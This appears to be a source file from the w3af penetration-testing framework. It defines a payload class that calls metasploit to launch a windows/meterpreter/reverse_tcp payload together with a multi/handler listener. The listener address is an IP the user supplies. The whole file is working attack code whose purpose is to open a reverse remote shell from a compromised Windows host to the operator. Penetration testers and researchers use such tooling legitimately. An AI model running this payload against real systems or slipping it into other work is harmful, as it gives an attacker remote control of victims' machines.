from w3af.plugins.attack.payloads.payloads.metasploit import metasploit


class msf_windows_meterpreter_reverse_tcp(metasploit):
    """
    This payload creates a reverse meterpreter shell in windows using the
    metasploit framework.

    Usage: payload msf_windows_meterpreter_reverse <your_ip_address>
    """
    def run_execute(self, ip_address):
        msf_args = 'windows/meterpreter/reverse_tcp LHOST=%s |'
        msf_args += ' exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp'
        msf_args += ' LHOST=%s E'
        msf_args = msf_args % (ip_address, ip_address)

        api_result = self.api_execute(msf_args)
        return api_result
